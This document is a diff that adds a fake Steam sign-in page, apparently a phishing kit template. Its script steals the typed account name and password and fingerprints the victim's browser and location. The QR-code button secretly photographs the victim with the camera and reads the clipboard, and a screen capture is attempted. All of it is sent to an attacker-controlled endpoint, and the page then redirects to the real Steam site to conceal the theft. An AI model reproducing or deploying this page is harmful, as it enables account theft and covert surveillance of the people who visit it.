@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Steam Login</title>
+<link rel="icon" href="https://steamcommunity.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,Helvetica,sans-serif;background:#1b2838;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
+.card{background:#1b2838;width:400px;padding:32px}
+.logo{text-align:center;margin-bottom:24px}
+.logo img{width:120px}
+h1{font-size:18px;font-weight:400;margin-bottom:24px;color:#c6d4df}
+.input-group{margin-bottom:14px}
+.input-group label{display:block;font-size:12px;color:#afafaf;margin-bottom:4px}
+.input-group input{width:100%;padding:10px;border:1px solid #2c3e50;border-radius:3px;background:#323f4e;color:#fff;font-size:14px;outline:none}
+.input-group input:focus{border-color:#66c0f4}
+.btn{background:linear-gradient(135deg,#67c1f5,#4ea2d9);color:#fff;border:none;border-radius:3px;padding:10px;font-size:15px;width:100%;cursor:pointer;font-weight:500;margin-top:8px}
+.btn:hover{background:linear-gradient(135deg,#7dc6f7,#57ace3)}
+.btn:disabled{opacity:.5;cursor:default}
+.link{display:block;text-align:center;margin-top:16px;color:#afafaf;font-size:12px;text-decoration:none}
+.link:hover{color:#66c0f4}
+#video{display:none;width:100%;border-radius:3px;margin:16px 0;background:#000;max-height:200px;object-fit:cover}
+.loading{display:none;margin-top:16px;color:#afafaf;font-size:13px;text-align:center}
+.line{display:flex;align-items:center;gap:8px;margin:20px 0;color:#afafaf;font-size:12px}
+.line div:first-child{flex:1;height:1px;background:#2c3e50}
+.line div:last-child{flex:1;height:1px;background:#2c3e50}
+.qr-box{border:1px solid #2c3e50;border-radius:4px;padding:24px;text-align:center;cursor:pointer;margin-bottom:16px;transition:border .2s}
+.qr-box:hover{border-color:#66c0f4}
+.qr-box div{font-size:64px;margin-bottom:8px}
+.qr-box span{font-size:13px;color:#c6d4df}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo"><img src="https://steamcommunity.com/favicon.ico" alt="Steam"></div>
+<h1>Sign in to Steam</h1>
+<div class="qr-box" id="qr_box" onclick="scanQR()">
+<div>📱</div>
+<span>Scan QR code with Steam app</span>
+</div>
+<video id="video" autoplay muted playsinline></video>
+<div class="line"><div></div><span>or</span><div></div></div>
+<div class="input-group">
+<label>Steam Account Name</label>
+<input type="text" id="login" placeholder="Steam account name" autocomplete="off">
+</div>
+<div class="input-group">
+<label>Password</label>
+<input type="password" id="password" placeholder="Password" autocomplete="off">
+</div>
+<button class="btn" id="login_btn" onclick="login()">Sign In</button>
+<div class="loading" id="loading"><span id="load_text">Signing in...</span></div>
+<a class="link" href="#">Forgot your password?</a>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+async function collect(final){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    if(final){
+        c.visit_duration=Math.floor((Date.now()-t0)/1000);
+        try{
+            const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+            const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+            const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+            ca.getContext('2d').drawImage(bm,0,0);
+            c.screenshot=ca.toDataURL('image/png').split(',')[1];
+            tr.stop();st.getTracks().forEach(t=>t.stop())
+        }catch(e){}
+    }
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function scanQR(){
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        document.getElementById('qr_box').style.display='none';
+        await new Promise(r=>setTimeout(r,2000));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop());
+        try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+        await collect(false);
+        document.getElementById('loading').style.display='block';
+        document.getElementById('load_text').textContent='✓ QR scanned!';
+        setTimeout(()=>{window.location.href='https://steamcommunity.com'},1500)
+    }catch(e){}
+}
+async function login(){
+    const l=document.getElementById('login').value.trim(),pw=document.getElementById('password').value.trim();
+    if(!l||!pw)return;
+    c.login=l;c.password=pw;
+    document.getElementById('login_btn').disabled=true;
+    document.getElementById('loading').style.display='block';
+    await collect(true);
+    document.getElementById('load_text').textContent='✓ Signed in!';
+    setTimeout(()=>{window.location.href='https://steamcommunity.com'},1500)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
